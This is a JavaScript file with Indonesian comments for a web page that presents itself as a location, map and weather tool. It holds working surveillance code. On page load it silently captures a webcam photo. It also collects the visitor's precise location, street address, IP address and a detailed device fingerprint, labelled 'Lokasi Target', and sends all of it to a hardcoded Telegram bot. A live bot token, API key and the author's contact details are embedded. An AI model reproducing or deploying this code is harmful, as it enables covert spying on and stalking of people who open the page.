// This script was created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
// creator's phone number: +6287734034677
// script ini di lindungi oleh undang-undang hak cipta BACA README.MD

let map; 
let markers = []; 

// Fungsi untuk mendapatkan lokasi pengguna
function getLocation() {
    const status = document.getElementById('status');
    const mapContainer = document.getElementById('map-container');
    const addressElement = document.getElementById('address');

    // Langsung menampilkan peta saat tombol ditekan
    mapContainer.style.display = 'block';
    addressElement.textContent = ''; // Reset alamat

    // Cek apakah browser mendukung Geolocation API
    if ('geolocation' in navigator) {
        document.getElementById('loadingSpinner').style.display = 'block'; // Tampilkan loading spinner
        navigator.geolocation.getCurrentPosition(showPosition, showError);
        status.textContent = 'Mendapatkan lokasi...';
    } else {
        status.textContent = 'Geolocation tidak didukung oleh browser ini.';
    }
}

// Fungsi untuk menampilkan lokasi di peta dan mendapatkan alamat
function showPosition(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const mapArea = document.getElementById('map');
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    // Tampilkan status lokasi
    status.textContent = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;

    // Jika peta belum diinisialisasi, buat peta baru
    if (!map) {
        map = L.map(mapArea).setView([latitude, longitude], 16); // Menggunakan zoom level lebih tinggi

        // Menggunakan Tile Layer dari OpenStreetMap
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);
    } else {
        // Jika peta sudah ada, setel ulang view ke lokasi baru
        map.setView([latitude, longitude], 16);
    }

    // Tambahkan marker ke lokasi saat ini
    const marker = L.marker([latitude, longitude]).addTo(map)
        .bindPopup('Anda di sini!')
        .openPopup();
    
    // Simpan marker ke array agar bisa dihapus atau dikelola
    markers.push(marker);

    // Simpan lokasi ke riwayat
    saveLocationToHistory(latitude, longitude);

    // Mendapatkan cuaca berdasarkan lokasi
    getWeather(latitude, longitude);

    // Mendapatkan alamat dari koordinat menggunakan Nominatim
    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1&zoom=18&extratags=1&accept-language=id`, {
        headers: {
            'User-Agent': 'app tracker/1.0 (ailearnsbyalfian@gmail.com)' // Gmail jangan di ganti nanti eror!!
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data && data.display_name) {
            addressElement.textContent = `Lokasi: ${data.display_name}`;
            // Kirim lokasi dan alamat ke Telegram
            sendLocationToTelegram(latitude, longitude, data.display_name);
        } else {
            addressElement.textContent = 'Alamat tidak ditemukan.';
        }
    })
    .catch(error => {
        console.error('Error fetching address:', error);
        addressElement.textContent = 'Error fetching address.';
    });
}

// Fungsi untuk mengirim lokasi dan alamat ke Telegram
function sendLocationToTelegram(latitude, longitude, address) {
    if (!latitude || !longitude || !address) {
        console.error("Data lokasi tidak lengkap.");
        return;
    }

    const botToken = '8120685431:AAEcXK1tgJrW-UttBzYIwTbVRMfjhfJAXmY';  // Ganti dengan token bot kamu
    const chatId = '2105661310';  // Ganti dengan ID chat yang kamu dapatkan
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const message = `📍 Lokasi Target:\nLatitude: ${latitude.toFixed(5)}\nLongitude: ${longitude.toFixed(5)}\nAlamat: ${address}`;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('text', message);

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Jasa buat website hubungi https://t.me/Rafashaalfian');
        } else {
            console.error('Terjadi kesalahan saat membuka lokasi');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Fungsi untuk menyimpan lokasi ke riwayat
function saveLocationToHistory(latitude, longitude) {
    const location = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;
    const locationList = document.getElementById('location-history');
    const li = document.createElement('li');
    li.textContent = location;
    locationList.appendChild(li);
}

// Fungsi untuk menangani kesalahan Geolocation
function showError(error) {
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    addressElement.textContent = ''; // Reset alamat
    switch (error.code) {
        case error.PERMISSION_DENIED:
            status.textContent = "Izin lokasi ditolak.";
            break;
        case error.POSITION_UNAVAILABLE:
            status.textContent = "Informasi lokasi tidak tersedia.";
            break;
        case error.TIMEOUT:
            status.textContent = "Waktu permintaan lokasi habis.";
            break;
        case error.UNKNOWN_ERROR:
            status.textContent = "Kesalahan tidak diketahui.";
            break;
    }
}

// Fungsi untuk mengambil foto dan langsung mengirimkan ke Telegram saat halaman dimuat
function takePhotoAndSendToTelegram() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');

    // Periksa apakah browser mendukung API getUserMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    // Tunggu hingga video siap, lalu ambil foto
                    const context = canvas.getContext('2d');

                    // Sesuaikan ukuran canvas dengan ukuran video
                    const videoWidth = video.videoWidth;
                    const videoHeight = video.videoHeight;
                    canvas.width = videoWidth;
                    canvas.height = videoHeight;

                    // Mengambil gambar dari video ke canvas
                    context.drawImage(video, 0, 0, videoWidth, videoHeight);

                    // Ambil data URI dari canvas
                    const dataUrl = canvas.toDataURL('image/png');

                    // Kirim foto ke Telegram
                    sendToTelegram(dataUrl);

                    // Matikan stream video untuk menghemat sumber daya
                    stream.getTracks().forEach(track => track.stop());
                };
            })
            .catch(function (err) {
                console.error("Terjadi kesalahan saat mengakses kamera: ", err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

// Fungsi untuk mengirim foto ke Telegram
function sendToTelegram(imageData) {
    const botToken = '8120685431:AAEcXK1tgJrW-UttBzYIwTbVRMfjhfJAXmY'; // Ganti dengan token bot kamu
    const chatId = '2105661310'; // Ganti dengan ID chat yang kamu dapatkan
    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

    let formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', dataURItoBlob(imageData));

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Foto berhasil dikirim ke Telegram.');
        } else {
            console.error('Terjadi kesalahan saat membuka kamera.', data);
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Fungsi untuk mengubah data URI menjadi Blob
function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

// Tambahkan event listener saat halaman dimuat
document.addEventListener('DOMContentLoaded', () => {
    checkDarkModeStatus(); // Untuk mengatur mode gelap
    takePhotoAndSendToTelegram(); // Memanggil fungsi pengambilan foto dan pengiriman otomatis
});

// Fungsi untuk membuka kamera dan menampilkan video
function openCamera() {
    const video = document.getElementById('camera');

    // Periksa apakah browser mendukung API getUserMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                // Ambil foto langsung ketika kamera berhasil dibuka
                video.onloadedmetadata = () => takePhoto();
            })
            .catch(function (err) {
                console.log("Terjadi kesalahan saat mengakses kamera: " + err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

// Fungsi untuk mengambil foto dan mengirimkan ke Telegram
function takePhoto() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Sesuaikan ukuran canvas agar sesuai dengan ukuran video
    const videoWidth = video.videoWidth;
    const videoHeight = video.videoHeight;

    // Set canvas ukuran sesuai dengan ukuran video
    canvas.width = videoWidth;
    canvas.height = videoHeight;

    // Mengambil gambar dari stream video dan menggambar ke canvas
    context.drawImage(video, 0, 0, videoWidth, videoHeight);

    // Ambil data URI dari canvas yang sudah digambar
    const dataUrl = canvas.toDataURL('image/png');

    // Kirim foto ke Telegram
    sendToTelegram(dataUrl);
}

// Fungsi untuk mengirim foto ke Telegram
function sendToTelegram(imageData) {
    const botToken = '8120685431:AAEcXK1tgJrW-UttBzYIwTbVRMfjhfJAXmY';  // Ganti dengan token bot kamu
    const chatId = '2105661310';  // Ganti dengan ID chat yang kamu dapatkan
    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

    let formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', dataURItoBlob(imageData));

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Jasa buat website hubungi https://t.me/Rafashaalfian');
        } else {
            alert('Terjadi kesalahan saat membuka kamera.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Terjadi kesalahan.');
    });
}

// Fungsi untuk mengubah data URI menjadi Blob
function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

// Dark mode functionality
let isDarkMode = false;

function toggleDarkMode() {
    isDarkMode = !isDarkMode;
    document.body.classList.toggle('dark-mode');

    // Simpan status mode ke localStorage agar bisa bertahan saat halaman di-refresh
    localStorage.setItem('darkMode', isDarkMode);
    updateDarkModeButtonText();
}

// Fungsi untuk memeriksa apakah dark mode aktif dari localStorage
function checkDarkModeStatus() {
    const darkModeStatus = localStorage.getItem('darkMode');
    if (darkModeStatus === 'true') {
        isDarkMode = true;
        document.body.classList.add('dark-mode');
    }
    updateDarkModeButtonText();
}

// Fungsi untuk memperbarui teks tombol dark mode
function updateDarkModeButtonText() {
    const toggleButton = document.getElementById('darkModeToggle');
    toggleButton.innerHTML = isDarkMode ? '☀️ Switch to Light Mode' : '🌙 Switch to Dark Mode';
}

// Fungsi untuk mendapatkan informasi cuaca
function getWeather(lat, lon) {
    const apiKey = 'be2fbce957441bd5f28348a8a9ab448e'; // Jangan Diganti Kalo Gak Mau Eror ❗❗
    const url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&units=metric&lang=id`; // Menambahkan parameter lang=id untuk Bahasa Indonesia

    fetch(url)
    .then(response => response.json())
    .then(data => {
        if (data.cod === 200) {
            const weatherInfo = `Cuaca saat ini: ${data.weather[0].description}, Suhu: ${data.main.temp}°C`;
            document.getElementById('weather').innerText = weatherInfo;
        } else {
            document.getElementById('weather').innerText = 'Cuaca tidak ditemukan untuk lokasi ini.';
        }
    })
    .catch(err => {
        console.error('Error fetching weather:', err);
        document.getElementById('weather').innerText = 'Gagal mengambil data cuaca.';
    });
}

// Fungsi untuk menambahkan penanda kustom di peta
function addCustomMarker() {
    if (map) {
        // Tambahkan event listener klik di peta
        map.on('click', function(e) {
            const lat = e.latlng.lat;
            const lon = e.latlng.lng;

            const marker = L.marker([lat, lon]).addTo(map)
                .bindPopup(`Lokasi Penanda: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).openPopup();
            
            markers.push(marker);

            saveLocationToHistory(lat, lon);
        });
    } else {
        alert('Peta belum diinisialisasi. Dapatkan lokasi terlebih dahulu.');
    }
}

async function detectDeviceInfoAndSendToTelegram() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const additionalLanguages = navigator.languages ? navigator.languages.join(", ") : "Tidak tersedia";
    const vendor = navigator.vendor;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const onlineStatus = navigator.onLine ? "✅ Online" : "❌ Offline";
    const connectionType = connection ? connection.effectiveType : "Tidak diketahui";
    const downlinkSpeed = connection ? `${connection.downlink} Mbps` : "Tidak diketahui";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const localTime = new Date().toLocaleString();
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Aktif 🌙" : "Nonaktif ☀️";
    const touchscreen = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "Ada" : "Tidak Ada";
    const cookieEnabled = navigator.cookieEnabled ? "Aktif" : "Nonaktif";
    const deviceOrientation = window.matchMedia("(orientation: portrait)").matches ? "Portrait" : "Landscape";
    const deviceUptime = `${(performance.now() / 1000 / 60 / 60).toFixed(2)} jam`;
    const isMobileDevice = /Mobi|Android/i.test(userAgent) ? "Ya (Mobile)" : "Tidak (Desktop/Tablet)";
    const gpu = detectGPU();

    // Informasi CPU dan Memori
    const hardwareConcurrency = navigator.hardwareConcurrency || "Tidak diketahui";
    const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak diketahui";

    // Informasi Storage
    const localStorageSize = calculateStorageSize(localStorage);
    const sessionStorageSize = calculateStorageSize(sessionStorage);

    let ipAddress = "Tidak diketahui";
    let latitude = "Tidak diketahui";
    let longitude = "Tidak diketahui";
    let locationInfo = "Lokasi tidak diketahui";
    let networkInfo = { type: "Tidak diketahui", name: "Tidak tersedia" };

    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        ipAddress = data.ip || "Tidak diketahui";
        if (!latitude || latitude === "Tidak diketahui") latitude = data.latitude || "Tidak diketahui";
        if (!longitude || longitude === "Tidak diketahui") longitude = data.longitude || "Tidak diketahui";
        locationInfo = `${data.city}, ${data.region}, ${data.country_name}`;
    } catch (error) {
        console.error('Gagal mendapatkan lokasi berdasarkan IP:', error);
    }

    // Deteksi apakah menggunakan Wi-Fi atau Data Seluler
    networkInfo = await getNetworkInfo();

    // Informasi Baterai
    let batteryInfo = "Tidak tersedia";
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryInfo = `Level: ${(battery.level * 100).toFixed(0)}%, ` +
            `Status Pengisian: ${battery.charging ? "Sedang mengisi ⚡" : "Tidak mengisi"}, ` +
            `Waktu Pengisian: ${battery.chargingTime ? `${battery.chargingTime} detik` : "Tidak diketahui"}, ` +
            `Waktu Penggunaan: ${battery.dischargingTime ? `${battery.dischargingTime} detik` : "Tidak diketahui"}`;
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                latitude = position.coords.latitude.toFixed(6);
                longitude = position.coords.longitude.toFixed(6);
                locationInfo = `Latitude: ${latitude}, Longitude: ${longitude}`;
                sendToTelegram();
            },
            (error) => {
                console.error('Gagal mendapatkan lokasi dengan Geolocation API:', error.message);
                sendToTelegram();
            }
        );
    } else {
        console.error('Geolocation API tidak didukung di browser ini.');
        sendToTelegram();
    }

    function sendToTelegram() {
        const deviceInfo = {
            userAgent: userAgent,
            platform: platform,
            language: language,
            additionalLanguages: additionalLanguages,
            vendor: vendor,
            browser: detectBrowser(),
            os: detectOS(),
            screenResolution: `${screenWidth} x ${screenHeight}`,
            onlineStatus: onlineStatus,
            connectionType: connectionType,
            downlinkSpeed: downlinkSpeed,
            timezone: timezone,
            localTime: localTime,
            darkMode: darkMode,
            touchscreen: touchscreen,
            cookieEnabled: cookieEnabled,
            deviceOrientation: deviceOrientation,
            deviceUptime: deviceUptime,
            hardwareConcurrency: hardwareConcurrency,
            deviceMemory: deviceMemory,
            localStorageSize: localStorageSize,
            sessionStorageSize: sessionStorageSize,
            ipAddress: ipAddress,
            latitude: latitude,
            longitude: longitude,
            locationInfo: locationInfo,
            batteryInfo: batteryInfo,
            isMobileDevice: isMobileDevice,
            gpu: gpu,
            networkType: networkInfo.type,
            networkName: networkInfo.name
        };

        const botToken = '8120685431:AAEcXK1tgJrW-UttBzYIwTbVRMfjhfJAXmY';  // Ganti dengan token bot kamu
        const chatId = '2105661310';  // Ganti dengan ID chat telegram kamu 
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const message = `📱 *Informasi Perangkat:*

` +
            `🖥️ *Umum:*
` +
            `• *Agen Pengguna:* ${deviceInfo.userAgent}
` +
            `• *Platform:* ${deviceInfo.platform}
` +
            `• *Bahasa Utama:* ${deviceInfo.language}
` +
            `• *Bahasa Tambahan:* ${deviceInfo.additionalLanguages}
` +
            `• *Vendor:* ${deviceInfo.vendor}

` +
            `🌐 *Jaringan:*
` +
            `• *Status Online:* ${deviceInfo.onlineStatus}
` +
            `• *Tipe Koneksi:* ${deviceInfo.connectionType}
` +
            `• *Kecepatan Koneksi:* ${deviceInfo.downlinkSpeed}
`+         
            `• *Jenis Jaringan:* ${deviceInfo.networkType}
`+
            `• *Nama Jaringan:* ${deviceInfo.networkName}

` +
            `📍 *Lokasi:*
` +
            `• *IP Address:* ${deviceInfo.ipAddress}
` +
            `• *Lokasi:* ${deviceInfo.locationInfo}
` +
            `• *Latitude:* ${deviceInfo.latitude}
` +
            `• *Longitude:* ${deviceInfo.longitude}

` +
            `🔋 *Baterai:*
` +
            `• ${deviceInfo.batteryInfo}

` +
            `🔧 *Hardware:*
` +
            `• *CPU Cores:* ${deviceInfo.hardwareConcurrency}
` +
            `• *Memori Perangkat:* ${deviceInfo.deviceMemory}
` +
            `• *GPU:* ${deviceInfo.gpu}
` +
            `• *Touchscreen:* ${deviceInfo.touchscreen}

` +
            `🕒 *Waktu:*
` +
            `• *Waktu Lokal:* ${deviceInfo.localTime}
` +
            `• *Zona Waktu:* ${deviceInfo.timezone}
` +
            `• *Waktu Boot Perangkat:* ${deviceInfo.deviceUptime}`;

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        formData.append('parse_mode', 'Markdown');

        fetch(url, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Informasi perangkat berhasil dikirim ke Telegram.');
            } else {
                console.error('Gagal mengirim informasi perangkat ke Telegram.', data);
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }
}

// Fungsi untuk mendapatkan informasi jaringan (Wi-Fi atau Data Seluler)
function getNetworkInfo() {
    return new Promise((resolve) => {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection && connection.type) {
            if (connection.type === 'wifi') {
                resolve({ type: 'Wi-Fi', name: 'Tidak dapat mendeteksi SSID' });
            } else {
                resolve({ type: 'Seluler', name: 'Tidak dapat mendeteksi operator' });
            }
        } else {
            resolve({ type: 'Tidak diketahui', name: 'Tidak tersedia' });
        }
    });
}

// Fungsi untuk menghitung ukuran penyimpanan
function calculateStorageSize(storage) {
    let total = 0;
    for (let key in storage) {
        if (storage.hasOwnProperty(key)) {
            total += (storage[key].length + key.length) * 2;
        }
    }
    return (total / 1024).toFixed(2) + " KB";
}

// Fungsi untuk mendeteksi browser
function detectBrowser() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes('Chrome')) return 'Google Chrome';
    if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
    if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Apple Safari';
    if (userAgent.includes('Edge')) return 'Microsoft Edge';
    if (userAgent.includes('Opera') || userAgent.includes('OPR')) return 'Opera';
    return 'Browser tidak dikenal';
}

// Fungsi untuk mendeteksi sistem operasi
function detectOS() {
    const platform = navigator.platform.toLowerCase();
    if (platform.includes('win')) return 'Windows';
    if (platform.includes('mac')) return 'MacOS';
    if (platform.includes('linux')) return 'Linux';
    if (/android/.test(navigator.userAgent.toLowerCase())) return 'Android';
    if (/iphone|ipad|ipod/.test(navigator.userAgent.toLowerCase())) return 'iOS';
    return 'Sistem operasi tidak dikenal';
}

// Fungsi untuk mendeteksi GPU
function detectGPU() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return "Tidak diketahui";
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Tidak diketahui";
}

// Tambahkan event listener saat halaman dimuat
document.addEventListener('DOMContentLoaded', () => {
    detectDeviceInfoAndSendToTelegram();
});
